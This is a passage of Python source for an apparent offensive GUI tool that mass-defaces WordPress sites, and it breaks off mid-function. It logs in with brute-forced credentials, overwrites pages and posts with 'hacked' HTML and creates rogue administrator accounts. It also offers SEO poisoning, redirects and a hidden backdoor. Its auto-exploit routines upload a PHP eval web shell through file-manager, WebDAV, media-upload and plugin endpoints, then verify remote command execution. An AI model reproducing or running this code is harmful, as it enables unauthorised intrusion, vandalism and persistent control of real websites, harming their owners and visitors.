        input_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='Target URLs/File (from WP Brute or CVE Exploiter):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        url_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        url_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.url_entry = tk.Entry(url_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'])
        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        tk.Button(url_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_file).pack(side=tk.LEFT)
        tk.Button(url_frame, text='Load from Brute', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_yellow'], command=self.load_from_brute).pack(side=tk.LEFT, padx=(5, 0))
        cred_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        cred_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(cred_frame, text='Username:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.username_entry = tk.Entry(cred_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=20)
        self.username_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(cred_frame, text='Password:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.password_entry = tk.Entry(cred_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=20, show='*')
        self.password_entry.pack(side=tk.LEFT)

    def setup_deface_editor(self, parent):
        editor_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        editor_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 8))
        editor_header = tk.Frame(editor_frame, bg=self.colors['bg'])
        editor_header.pack(fill=tk.X, padx=10, pady=(8, 4))
        tk.Label(editor_header, text='Deface HTML Editor:', font=('Courier', 10, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(side=tk.LEFT)
        template_frame = tk.Frame(editor_header, bg=self.colors['bg'])
        template_frame.pack(side=tk.RIGHT)
        tk.Button(template_frame, text='Load Template', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.load_template).pack(side=tk.LEFT, padx=2)
        tk.Button(template_frame, text='Clear', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_red'], command=self.clear_editor).pack(side=tk.LEFT, padx=2)
        self.deface_editor = scrolledtext.ScrolledText(editor_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=15, wrap=tk.WORD)
        self.deface_editor.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        default_deface = '<!DOCTYPE html>\n<html>\n<head>\n    <title>SCURED WITH E.L.V ENGINE</title>\n    <meta charset="UTF-8">\n    <style>\n        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }\n        h1 { color: #f00; font-size: 48px; text-shadow: 0 0 10px #f00; }\n        p { font-size: 24px; }\n    </style>\n</head>\n<body>\n    <h1>SYSTEM SECURED BY E.L.V ENGINE</h1>\n    <p>Your site has been compromised</p>\n    <p>Security is a myth</p>\n</body>\n</html>'
        self.deface_editor.insert(1.0, default_deface)

    def setup_options_section(self, parent):
        options_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        options_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(options_frame, text='Deface Options:', font=('Courier', 10, 'bold'), fg=self.colors['fg_purple'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        options_inner = tk.Frame(options_frame, bg=self.colors['bg'])
        options_inner.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.deface_pages_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Deface All Pages', variable=self.deface_pages_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.deface_posts_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Deface All Posts', variable=self.deface_posts_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.create_admin_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Create Admin User', variable=self.create_admin_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.seo_poison_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='SEO Poisoning (Meta Tags)', variable=self.seo_poison_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.redirect_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='Inject Redirects', variable=self.redirect_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.hidden_backdoor_var = tk.BooleanVar(value=True)
        tk.Checkbutton(options_inner, text='Embed Hidden Backdoor', variable=self.hidden_backdoor_var, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        self.auto_exploit_var = tk.BooleanVar(value=False)
        tk.Checkbutton(options_inner, text='Auto-Exploit (RCE/WebDAV/File Upload/React2Shell/CVE) - No credentials needed', variable=self.auto_exploit_var, font=('Courier', 9, 'bold'), bg=self.colors['bg'], fg=self.colors['fg_red'], selectcolor=self.colors['entry_bg']).pack(anchor=tk.W, pady=2)
        config_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        config_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(config_frame, text='Threads:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.threads_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.threads_entry.insert(0, '5')
        self.threads_entry.pack(side=tk.LEFT, padx=(0, 10))
        tk.Label(config_frame, text='Timeout:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.timeout_entry = tk.Entry(config_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], width=8)
        self.timeout_entry.insert(0, '15')
        self.timeout_entry.pack(side=tk.LEFT)
        button_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        self.start_button = tk.Button(button_frame, text='[START DEFACE]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, command=self.start_deface, width=20, height=2)
        self.start_button.pack(fill=tk.X, pady=2)
        self.stop_button = tk.Button(button_frame, text='[STOP]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, command=self.stop_deface, width=20, height=2, state=tk.DISABLED)
        self.stop_button.pack(fill=tk.X, pady=2)
        self.save_button = tk.Button(button_frame, text='[SAVE RESULTS]', font=('Courier', 9, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, command=self.save_results, width=20)
        self.save_button.pack(fill=tk.X, pady=2)

    def setup_log_section(self, parent):
        log_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        log_frame.pack(fill=tk.BOTH, expand=True)
        tk.Label(log_frame, text='Logs & Results:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        self.stats_label = tk.Label(log_frame, text='Total: 0 | Processed: 0 | Defaced: 0 | Posts: 0 | Users: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=10)
        self.stats_label.pack(fill=tk.X, pady=(0, 4))
        self.log_text = scrolledtext.ScrolledText(log_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=20, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))
        self.results_text = scrolledtext.ScrolledText(log_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg_green'], height=8, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 8))

    def browse_file(self):
        filename = filedialog.askopenfilename(title='Select Target File', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, filename)

    def load_from_brute(self):
        try:
            import glob
            brute_files = glob.glob('bruteforce_urls_*.txt')
            if brute_files:
                latest = max(brute_files, key=os.path.getctime)
                self.url_entry.delete(0, tk.END)
                self.url_entry.insert(0, latest)
                self.log(f'Loaded from: {latest}', 'fg_cyan')
            else:
                messagebox.showwarning('Warning', 'No brute force results found!')
        except:
            messagebox.showerror('Error', 'Error loading brute force results!')

    def load_template(self):
        templates = {'Classic Hacked': '<!DOCTYPE html>\n<html>\n<head>\n    <title>SECURED BY E.L.V ENGINE</title>\n    <meta charset="UTF-8">\n    <style>\n        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }\n        h1 { color: #f00; font-size: 48px; text-shadow: 0 0 10px #f00; }\n    </style>\n</head>\n<body>\n    <h1>SECURED BY E.L.V ENGINE</h1>\n    <p>Your site has been compromised</p>\n</body>\n</html>', 'Matrix Style': '<!DOCTYPE html>\n<html>\n<head>\n    <title>HACKED</title>\n    <meta charset="UTF-8">\n    <style>\n        @keyframes matrix { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }\n        body { background: #000; color: #0f0; font-family: monospace; overflow: hidden; }\n        .matrix { position: absolute; animation: matrix 3s linear infinite; }\n    </style>\n</head>\n<body>\n    <h1 style="text-align:center;color:#f00;font-size:60px;z-index:999;position:relative;">HACKED</h1>\n</body>\n</html>', 'Minimal': '<html><head><title>Hacked</title></head><body style="background:#000;color:#0f0;text-align:center;padding:50px;font-family:monospace;"><h1 style="color:#f00;">HACKED</h1></body></html>'}
        template_window = tk.Toplevel(self.frame)
        template_window.title('Select Template')
        template_window.geometry('300x200')
        template_window.configure(bg=self.colors['bg'])
        tk.Label(template_window, text='Select Deface Template:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(pady=10)
        for name, content in templates.items():

            def load_template(name=name, content=content):
                self.deface_editor.delete(1.0, tk.END)
                self.deface_editor.insert(1.0, content)
                template_window.destroy()
            tk.Button(template_window, text=name, font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg_green'], command=load_template, width=25).pack(pady=3)

    def clear_editor(self):
        self.deface_editor.delete(1.0, tk.END)

    def start_deface(self):
        url_input = self.url_entry.get().strip()
        if not url_input:
            messagebox.showerror('Error', 'Please enter target URLs or select a file!')
            return
        username = self.username_entry.get().strip()
        password = self.password_entry.get().strip()
        from urllib.parse import urlparse
        has_creds_in_url = False
        if not os.path.isfile(url_input):
            test_parsed = urlparse(url_input)
            if test_parsed.fragment and '@' in test_parsed.fragment:
                has_creds_in_url = True
        else:
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    first_line = f.readline().strip()
                    if first_line and '#' in first_line and ('@' in first_line.split('#', 1)[-1]):
                        has_creds_in_url = True
            except:
                pass
        if has_creds_in_url:
            self.log('[INFO] Credentials detected in URL(s), will auto-extract...', 'fg_cyan')
        elif not username or not password:
            messagebox.showwarning('Warning', 'Username and password are required for deface (or use URL format dengan # sebagai pemisah: wp-login.php#username@password)!')
            return
        try:
            threads = int(self.threads_entry.get() or '5')
            if threads < 1:
                threads = 1
            if threads > 20:
                threads = 20
        except:
            threads = 5
        try:
            timeout = int(self.timeout_entry.get() or '15')
            if timeout < 1:
                timeout = 15
            if timeout > 60:
                timeout = 60
        except:
            timeout = 15
        self.is_running = True
        self.stop_flag = False
        self.deface_targets = []
        self.stats = {'total': 0, 'processed': 0, 'deface': 0, 'posts': 0, 'users': 0}
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log(f'Starting mass deface operation...', 'fg_cyan')
        thread = threading.Thread(target=self.deface_worker, args=(url_input, username, password, threads, timeout), daemon=True)
        thread.start()

    def stop_deface(self):
        self.stop_flag = True
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Deface operation stopped', 'fg_yellow')

    def deface_worker(self, url_input, username, password, threads, timeout):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        from urllib.parse import urlparse
        auto_exploit = self.auto_exploit_var.get()
        urls = []
        if os.path.isfile(url_input):
            try:
                with open(url_input, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (not line.startswith('#')):
                            parsed = urlparse(line)
                            if parsed.fragment and '@' in parsed.fragment:
                                cred_username, cred_password = parsed.fragment.split('@', 1)
                                url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'.replace('/wp-login.php', '').rstrip('/')
                                if url:
                                    urls.append({'url': url, 'username': cred_username, 'password': cred_password})
                                    self.log(f'[PARSE] Found credentials: {url} | {cred_username[:20]}...', 'fg_cyan')
                            else:
                                url = line.replace('/wp-login.php', '').rstrip('/')
                                if url and (url.startswith('http://') or url.startswith('https://')):
                                    urls.append({'url': url, 'username': username, 'password': password})
            except Exception as e:
                self.log(f'Error reading file: {str(e)[:50]}', 'fg_red')
                self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
                return
        else:
            parsed = urlparse(url_input)
            if parsed.fragment and '@' in parsed.fragment:
                cred_username, cred_password = parsed.fragment.split('@', 1)
                url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'.replace('/wp-login.php', '').rstrip('/')
                urls.append({'url': url, 'username': cred_username, 'password': cred_password})
                self.log(f'[PARSE] Found credentials in URL: {url} | {cred_username[:20]}...', 'fg_cyan')
            else:
                url = url_input.replace('/wp-login.php', '').rstrip('/')
                if url:
                    urls.append({'url': url, 'username': username, 'password': password})
        if not urls:
            self.log('No valid URLs found!', 'fg_red')
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            return
        self.stats['total'] = len(urls)
        self.stats_queue.put(self.stats.copy())
        deface_html = self.deface_editor.get(1.0, tk.END).strip()
        if not deface_html:
            self.log('Deface HTML is empty!', 'fg_red')
            self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
            self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            return
        auto_exploit = self.auto_exploit_var.get()
        max_workers = min(threads, len(urls))
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.deface_target, target, deface_html, timeout, auto_exploit): target for target in urls}
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                try:
                    result = future.result()
                    if result:
                        self.deface_targets.append(result)
                        with self.stats_lock:
                            self.stats['processed'] += 1
                            if result.get('deface'):
                                self.stats['deface'] += 1
                            if result.get('posts'):
                                self.stats['posts'] += result['posts']
                            if result.get('user_created'):
                                self.stats['users'] += 1
                        self.stats_queue.put(self.stats.copy())
                        result_text = f"[DEFACED] {result['url']} | Pages: {result.get('pages', 0)} | Posts: {result.get('posts', 0)} | Admin: {result.get('user_created', False)}\n"
                        self.frame.after(0, lambda rt=result_text: self.results_text.insert(tk.END, rt, 'green'))
                        self.frame.after(0, lambda: self.results_text.see(tk.END))
                except:
                    pass
        self.is_running = False
        self.frame.after(0, lambda: self.start_button.config(state=tk.NORMAL))
        self.frame.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
        self.log(f"Deface operation completed. Total: {self.stats['processed']} | Defaced: {self.stats['deface']}", 'fg_green')

    def deface_target(self, target_info, deface_html, timeout, auto_exploit=False):
        if self.stop_flag:
            return None
        url = target_info['url']
        username = target_info.get('username', '')
        password = target_info.get('password', '')
        exploit_result = None
        if auto_exploit:
            self.log(f'[AUTO-EXPLOIT] Attempting exploits on {url}...', 'fg_cyan')
            exploit_result = self.auto_exploit_target(url, timeout)
            if exploit_result and exploit_result.get('success'):
                self.log(f"[EXPLOIT-SUCCESS] {url} | Method: {exploit_result.get('method', 'N/A')}", 'fg_green')
                if exploit_result.get('shell_url'):
                    self.log(f"[SHELL] {exploit_result['shell_url']}", 'fg_purple')
                if exploit_result.get('credentials'):
                    creds = exploit_result['credentials']
                    username = creds.get('username', username)
                    password = creds.get('password', password)
                    self.log(f'[CREDS] {username}:{password[:10]}...', 'fg_cyan')
            else:
                self.log(f'[EXPLOIT-FAIL] {url} - Trying direct deface...', 'fg_yellow')
        if not username or not password:
            if not exploit_result or not exploit_result.get('success'):
                self.log(f'[SKIP] {url} - No credentials available', 'fg_yellow')
                return None
        try:
            session = requests.Session()
            session.headers.update(DEFAULT_HEADERS.copy())
            login_url = urljoin(url.rstrip('/'), '/wp-login.php')
            resp = session.get(login_url, timeout=timeout, verify=False)
            nonce = ''
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_input = soup.find('input', {'name': '_wpnonce'})
                if nonce_input:
                    nonce = nonce_input.get('value', '')
            else:
                nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', resp.text)
                nonce = nonce_match.group(1) if nonce_match else ''
            login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': urljoin(url, '/wp-admin/'), 'testcookie': '1', '_wpnonce': nonce}
            login_resp = session.post(login_url, data=login_data, timeout=timeout, verify=False, allow_redirects=True)
            if 'wp-admin' not in login_resp.url and 'dashboard' not in login_resp.text.lower():
                self.log(f'[LOGIN-FAIL] {url} | User: {username[:20]}...', 'fg_yellow')
                return None
            self.log(f'[LOGIN-SUCCESS] {url} | User: {username[:20]}...', 'fg_green')
            result = {'url': url, 'deface': False, 'pages': 0, 'posts': 0, 'user_created': False}
            if exploit_result and exploit_result.get('success'):
                result['exploit_method'] = exploit_result.get('method', 'N/A')
                if exploit_result.get('shell_url'):
                    result['shell_url'] = exploit_result['shell_url']
            if self.create_admin_var.get():
                admin_result = self.create_admin_user(session, url, timeout)
                if admin_result:
                    result['user_created'] = True
            if self.deface_pages_var.get():
                pages_count = self.deface_pages(session, url, deface_html, timeout)
                result['pages'] = pages_count
                if pages_count > 0:
                    result['deface'] = True
            if self.deface_posts_var.get():
                posts_count = self.deface_posts(session, url, deface_html, timeout)
                result['posts'] = posts_count
                if posts_count > 0:
                    result['deface'] = True
            if self.seo_poison_var.get():
                self.inject_seo_poison(session, url, timeout)
            if self.redirect_var.get():
                self.inject_redirects(session, url, timeout)
            if self.hidden_backdoor_var.get():
                self.embed_hidden_backdoor(session, url, deface_html, timeout)
            return result
        except Exception as e:
            return None

    def auto_exploit_target(self, url, timeout):
        if self.stop_flag:
            return None
        base = url.rstrip('/')
        session = requests.Session()
        session.headers.update(DEFAULT_HEADERS.copy())
        exploit_methods = [self.exploit_wp_file_manager, self.exploit_webdav_upload, self.exploit_file_upload_rce, self.exploit_wp_media_upload, self.exploit_plugin_file_upload]
        for method in exploit_methods:
            if self.stop_flag:
                break
            try:
                result = method(base, timeout, session)
                if result and result.get('success'):
                    shell_url = result.get('shell_url')
                    if shell_url:
                        self.log(f"[EXPLOIT-SUCCESS] {url} via {result.get('method')}", 'fg_green')
                        self.log(f'[SHELL] {shell_url}', 'fg_purple')
                    return result
            except Exception as e:
                continue
        return None

    def exploit_wp_file_manager(self, url, timeout, session):
        try:
            self.log(f'[EXPLOIT] Trying WP File Manager on {url}...', 'fg_cyan')
            endpoints = ['/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', '/wp-content/plugins/file-manager/lib/php/connector.minimal.php', '/wp-content/plugins/wp-file-manager/lib/php/connector.php', '/wp-content/plugins/file-manager/lib/php/connector.php']
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            shell_content = '<?php if(isset($_GET["c"])){eval(base64_decode($_GET["c"]));} ?>'
            for endpoint in endpoints:
                try:
                    upload_url = urljoin(url, endpoint)
                    files = {'upload[]': (shell_name, shell_content, 'application/x-php'), 'cmd': (None, 'upload'), 'target': (None, 'l1_Lw')}
                    resp = session.post(upload_url, files=files, timeout=timeout, verify=False)
                    if resp.status_code == 200:
                        shell_urls = [urljoin(url, f'/wp-content/plugins/wp-file-manager/lib/files/{shell_name}'), urljoin(url, f'/wp-content/plugins/file-manager/lib/files/{shell_name}'), urljoin(url, f'/wp-content/uploads/wp-file-manager/{shell_name}')]
                        for shell_url in shell_urls:
                            test_resp = session.get(shell_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=timeout, verify=False)
                            if 'OK' in test_resp.text:
                                self.log(f'[SUCCESS] WP File Manager shell: {shell_url}', 'fg_green')
                                return {'success': True, 'method': 'wp-file-manager', 'shell_url': shell_url}
                except:
                    continue
        except:
            pass
        return None

    def exploit_webdav_upload(self, url, timeout, session):
        try:
            self.log(f'[EXPLOIT] Trying WebDAV on {url}...', 'fg_cyan')
            webdav_paths = ['/webdav', '/dav', '/.well-known/webdav', '/wp-content/webdav']
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            shell_content = '<?php if(isset($_GET["c"])){eval(base64_decode($_GET["c"]));} ?>'
            for path in webdav_paths:
                try:
                    webdav_url = urljoin(url, path + '/' + shell_name)
                    resp = session.request('PUT', webdav_url, data=shell_content, headers={'Content-Type': 'application/x-php'}, timeout=timeout, verify=False)
                    if resp.status_code in [200, 201, 204]:
                        test_resp = session.get(webdav_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=timeout, verify=False)
                        if 'OK' in test_resp.text:
                            self.log(f'[SUCCESS] WebDAV shell: {webdav_url}', 'fg_green')
                            return {'success': True, 'method': 'webdav', 'shell_url': webdav_url}
                except:
                    continue
        except:
            pass
        return None

    def exploit_file_upload_rce(self, url, timeout, session):
        try:
            self.log(f'[EXPLOIT] Trying generic file upload on {url}...', 'fg_cyan')
            upload_endpoints = ['/wp-admin/admin-ajax.php?action=upload', '/wp-admin/async-upload.php', '/wp-content/plugins/contact-form-7/includes/upload.php']
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            shell_content = '<?php if(isset($_GET["c"])){eval(base64_decode($_GET["c"]));} ?>'
            for endpoint in upload_endpoints:
                try:
                    upload_url = urljoin(url, endpoint)
                    files = {'file': (shell_name, shell_content, 'application/x-php')}
                    data = {'action': 'upload', 'name': shell_name}
                    resp = session.post(upload_url, files=files, data=data, timeout=timeout, verify=False)
                    if resp.status_code == 200:
                        upload_urls = [urljoin(url, f'/wp-content/uploads/{shell_name}'), urljoin(url, f'/wp-content/uploads/2024/{shell_name}'), urljoin(url, f'/wp-content/uploads/2023/{shell_name}')]
                        for test_url in upload_urls:
                            test_resp = session.get(test_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=timeout, verify=False)
                            if 'OK' in test_resp.text:
                                self.log(f'[SUCCESS] File upload shell: {test_url}', 'fg_green')
                                return {'success': True, 'method': 'file-upload', 'shell_url': test_url}
                except:
                    continue
        except:
            pass
        return None

    def exploit_wp_media_upload(self, url, timeout, session):
        try:
            self.log(f'[EXPLOIT] Trying WP media upload on {url}...', 'fg_cyan')
            media_url = urljoin(url, '/wp-admin/async-upload.php')
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            shell_content = '<?php if(isset($_GET["c"])){eval(base64_decode($_GET["c"]));} ?>'
            files = {'async-upload': (shell_name, shell_content, 'application/x-php')}
            data = {'name': shell_name, 'action': 'upload-attachment'}
            resp = session.post(media_url, files=files, data=data, timeout=timeout, verify=False)
            if resp.status_code == 200:
                import json
                try:
                    result = resp.json()
                    if result.get('success'):
                        file_url = result.get('data', {}).get('url', '')
                        if file_url:
                            test_resp = session.get(file_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=timeout, verify=False)
                            if 'OK' in test_resp.text:
                                self.log(f'[SUCCESS] Media upload shell: {file_url}', 'fg_green')
                                return {'success': True, 'method': 'media-upload', 'shell_url': file_url}
                except:
                    pass
        except:
            pass
        return None

    def exploit_plugin_file_upload(self, url, timeout, session):
        try:
            self.log(f'[EXPLOIT] Trying plugin file upload on {url}...', 'fg_cyan')
            plugins = ['revslider', 'duplicator', 'backupbuddy', 'all-in-one-wp-migration']
            shell_name = f'shell{random.randint(10000, 99999)}.php'
            shell_content = '<?php if(isset($_GET["c"])){eval(base64_decode($_GET["c"]));} ?>'
            for plugin in plugins:
                endpoints = [f'/wp-content/plugins/{plugin}/includes/upload.php', f'/wp-content/plugins/{plugin}/admin/upload.php', f'/wp-admin/admin-ajax.php?action={plugin}_upload']
                for endpoint in endpoints:
                    try:
                        upload_url = urljoin(url, endpoint)
                        files = {'file': (shell_name, shell_content, 'application/x-php')}
                        data = {'action': 'upload', 'plugin': plugin}
                        resp = session.post(upload_url, files=files, data=data, timeout=timeout, verify=False)
                        if resp.status_code == 200:
                            test_urls = [urljoin(url, f'/wp-content/plugins/{plugin}/{shell_name}'), urljoin(url, f'/wp-content/uploads/{shell_name}')]
                            for test_url in test_urls:
                                test_resp = session.get(test_url + '?c=' + base64.b64encode(b'echo "OK";').decode(), timeout=timeout, verify=False)
                                if 'OK' in test_resp.text:
                                    self.log(f'[SUCCESS] Plugin upload shell: {test_url}', 'fg_green')
                                    return {'success': True, 'method': f'plugin-{plugin}', 'shell_url': test_url}
                    except:
                        continue
        except:
            pass
        return None

    def create_admin_user(self, session, url, timeout):
        try:
            admin_url = urljoin(url.rstrip('/'), '/wp-admin/user-new.php')
            resp = session.get(admin_url, timeout=timeout, verify=False)
            nonce = ''
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                nonce_input = soup.find('input', {'name': '_wpnonce_create-user'})
                if nonce_input:
                    nonce = nonce_input.get('value', '')
            else:
                nonce_match = re.search('name="_wpnonce_create-user"\\s+value="([^"]+)"', resp.text)
                nonce = nonce_match.group(1) if nonce_match else ''
            admin_username = f'admin{random.randint(1000, 9999)}'
            admin_email = f'{admin_username}@example.com'
            admin_password = f'Pass{random.randint(10000, 99999)}'
            user_data = {'action': 'createuser', '_wpnonce_create-user': nonce, '_wp_http_referer': '/wp-admin/user-new.php', 'user_login': admin_username, 'email': admin_email, 'pass1': admin_password, 'pass2': admin_password, 'role': 'administrator', 'createuser': 'Add New User'}
            create_resp = session.post(admin_url, data=user_data, timeout=timeout, verify=False)
            if 'user-new.php' not in create_resp.url or 'error' not in create_resp.text.lower():
                self.log(f'[ADMIN] Created user: {admin_username}:{admin_password} on {url}', 'fg_green')
                return {'username': admin_username, 'password': admin_password, 'email': admin_email}
        except:
            pass
        return None

    def deface_pages(self, session, url, deface_html, timeout):
        try:
            pages_url = urljoin(url.rstrip('/'), '/wp-admin/edit.php?post_type=page')
            resp = session.get(pages_url, timeout=timeout, verify=False)
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                page_links = soup.find_all('a', {'class': 'row-title'})
                page_ids = []
                for link in page_links[:20]:
                    href = link.get('href', '')
                    if 'post=' in href:
                        page_id = re.search('post=(\\d+)', href)
                        if page_id:
                            page_ids.append(page_id.group(1))
            else:
                page_ids = re.findall('post=(\\d+)', resp.text)[:20]
            defaced_count = 0
            for page_id in page_ids:
                if self.stop_flag:
                    break
                try:
                    edit_url = urljoin(url.rstrip('/'), f'/wp-admin/post.php?post={page_id}&action=edit')
                    edit_resp = session.get(edit_url, timeout=timeout, verify=False)
                    nonce = ''
                    if BeautifulSoup:
                        soup = BeautifulSoup(edit_resp.text, 'html.parser')
                        nonce_input = soup.find('input', {'name': '_wpnonce'})
                        if nonce_input:
                            nonce = nonce_input.get('value', '')
                    else:
                        nonce_match = re.search('name="_wpnonce"\\s+value="([^"]+)"', edit_resp.text)
                        nonce = nonce_match.group(1) if nonce_match else ''
                    update_data = {'action': 'editpost', 'post_ID': page_id, '_wpnonce': nonce, 'content': deface_html, 'save': 'Update'}
                    update_resp = session.post(edit_url, data=update_data, timeout=timeout, verify=False)
                    if update_resp.status_code == 200:
                        defaced_count += 1
                except:
                    continue
            return defaced_count
        except:
            return 0

    def deface_posts(self, session, url, deface_html, timeout):
        try:
            posts_url = urljoin(url.rstrip('/'), '/wp-admin/edit.php')
            resp = session.get(posts_url, timeout=timeout, verify=False)
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                post_links = soup.find_all('a', {'class': 'row-title'})
                post_ids = []
                for link in post_links[:30]:
                    href = link.get('href', '')
                    if 'post=' in href:
                        post_id = re.search('post=(\\d+)', href)
                        if post_id:
                            post_ids.append(post_id.group(1))
            else:
                post_ids = re.findall('post=(\\d+)', resp.text)[:30]
            defaced_count = 0
            for post_id in post_ids:
                if self.stop_flag:
                    break
                try:
                    edit_url = urljoin(url.rstrip('/'), f'/wp-admin/post.php?post={post_id}&action=edit')
                    edit_resp = session.get(edit_url, timeout=timeout, verify=False)
                    nonce = ''
